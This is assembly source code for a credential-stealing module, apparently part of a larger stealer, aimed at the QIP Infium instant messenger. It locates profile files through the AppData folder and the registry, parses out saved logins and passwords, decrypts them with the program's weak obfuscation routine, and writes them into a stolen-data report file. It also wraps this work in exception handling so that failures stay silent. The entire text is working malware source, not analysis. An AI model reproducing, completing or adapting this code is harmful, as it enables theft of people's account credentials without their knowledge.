     
.data?
     InfiumAppData db 200h dup (?)
     InfiumTmpBuf1 db 200h dup (?)
     InfiumTmpBuf2 db 200h dup (?)
     infium_login  db 100h dup (?)
     infium_pwd    db 100h dup (?)
     ifd           WIN32_FIND_DATA <>
     
.code

ProcessInfiumDir proc uses ebx s_from:DWORD
     LOCAL   hFind :DWORD
     LOCAL   local3 :DWORD
     LOCAL   local1 :DWORD
     
     FindFirstFile, s_from, addr ifd
     mov     dword ptr [hFind], eax
     cmp     eax, -1
     je      infium_fail_2
     
     lstrlen, s_from
     add     eax, dword ptr [s_from]
     mov     byte ptr [eax - 1], 0
     
     jmp     infium_skip_search
infium_search_lp:
     lstrcmp, addr ifd.cFileName, addr fake1
     test    eax, eax
     je      infium_skip_search
     lstrcmp, addr ifd.cFileName, addr fake2
     test    eax, eax
     je      infium_skip_search
     
     push    offset ifd.cFileName
     push    offset ifd.cFileName
     push    dword ptr [s_from]
     push    offset infium_smask
     push    offset InfiumTmpBuf2
     call    wsprintf
     add     esp, 5*4
     
     invoke  MapFile, addr InfiumTmpBuf2, addr mfile, MAP_FILE_A
     test    eax, eax
     je      infium_skip_search
     mov     ebx, mfile.lpMem
     
     push    3
     pop     eax
     mov     local1, eax
     mov     ecx, mfile.dwFileSize
     mov     local3, ecx
     cmp     ecx, eax
     jbe     infium_total_shit
     
infium_parse_lp:
     mov     ecx, 3
     xor     edx, edx
     mov     edi, offset words_3
     lea     esi, dword ptr [ebx+eax]
     repe    cmpsw
     jne     infium_skip_dunno
     mov     cl, byte ptr [ebx+eax-2]
     cmp     cl, 2
     je      infium_skip_dunno
     test    cl, cl
     je      infium_skip_small_shit
     lea     ecx, dword ptr [eax+ebx-2]
infium_get_len:
     inc     edx
     dec     ecx
     movzx   esi, byte ptr [ecx]
     cmp     edx, esi
     jne     infium_get_len
infium_skip_small_shit:
     movzx   edi, byte ptr [eax+ebx+6]
     mov     ecx, eax
     sub     ecx, edx
     add     ecx, ebx
     movzx   esi, byte ptr [ecx-2]
     test    esi, esi
     je      infium_skip_dunno
     cmp     esi, 2
     je      infium_skip_dunno
     test    edi, edi
     je      infium_skip_dunno
     dec     ecx
     pushad
     RtlMoveMemory, addr infium_login, ecx, esi
     popad
     mov     byte ptr [infium_login+esi], 0
     mov     eax, local1
     lea     ecx, dword ptr [eax+ebx+7]
     pushad
     RtlMoveMemory, addr infium_pwd, ecx, edi
     popad
     mov     byte ptr [infium_pwd+edi], 0
     pushad
     push    offset infium_login
     call    infium_decrypt
     push    offset infium_pwd
     call    infium_decrypt
     
     lstrlen, addr infium_login
     mov     dword ptr [plen], eax
     add     dword ptr [DataSize], sizeof plen
     add     dword ptr [DataSize], eax
     WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
     mov     byte ptr [data_type], REPORT_DATA_LOGIN
     add     dword ptr [DataSize], sizeof data_type
     WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
     WriteFile, stfile, addr infium_login, plen, addr SNW, NULL
     
     lstrlen, addr infium_pwd
     mov     dword ptr [plen], eax
     add     dword ptr [DataSize], sizeof plen
     add     dword ptr [DataSize], eax
     WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
     mov     byte ptr [data_type], REPORT_DATA_PWD
     add     dword ptr [DataSize], sizeof data_type
     WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
     WriteFile, stfile, addr infium_pwd, plen, addr SNW, NULL
     
     RtlZeroMemory, addr infium_login, sizeof infium_login
     RtlZeroMemory, addr infium_pwd, sizeof infium_pwd
     
     popad
infium_skip_dunno:
     inc     eax
     mov     local1, eax
     cmp     eax, local3
     jb      infium_parse_lp
     
infium_total_shit:
     invoke  UnmapFile, addr mfile
     
infium_skip_search:
     FindNextFile, hFind, addr ifd
     test    eax, eax
     jne     infium_search_lp
     FindClose, hFind
     
infium_fail_2:
     
     ret
ProcessInfiumDir endp

GetInfiumPwd proc
      LOCAL   WTF:DWORD
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], QIPINFIUM_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetInfiumPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      push    0
      push    CSIDL_APPDATA
      push    offset InfiumAppData
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      test    eax, eax
      je      infium_try1_fail
      lstrcpy, addr InfiumTmpBuf1, addr InfiumAppData
      lstrcat, addr InfiumTmpBuf1, addr infium_str_1
      lstrcat, addr InfiumTmpBuf1, addr wildc
      push    offset InfiumTmpBuf1
      call    ProcessInfiumDir
    infium_try1_fail:
      
      invoke  RegRead, HKEY_CURRENT_USER, addr q_inf_uninstall, addr q_inf_install_loc, addr InfiumTmpBuf1, sizeof InfiumTmpBuf1, REG_READ_A
      test    eax, eax
      je      q_inf_failed_1
      push    offset InfiumTmpBuf1
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr InfiumTmpBuf1, addr q_inf_users
      push    offset InfiumTmpBuf1
      call    ProcessInfiumDir
    q_inf_failed_1:
      
    GetInfiumPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetInfiumPwd endp

infium_decrypt proc string :DWORD
     lstrlen, string
     test    eax, eax
     je      infium_empty
     mov     ecx, eax
     xor     edx, edx
     mov     esi, dword ptr [string]
     mov     edi, esi
infium_decr_lp:
     lodsb
     add     al, dl
     not     al
     dec     al
     stosb
     inc     edx
     dec     ecx
     jnz     infium_decr_lp
infium_empty:
     ret
infium_decrypt endp
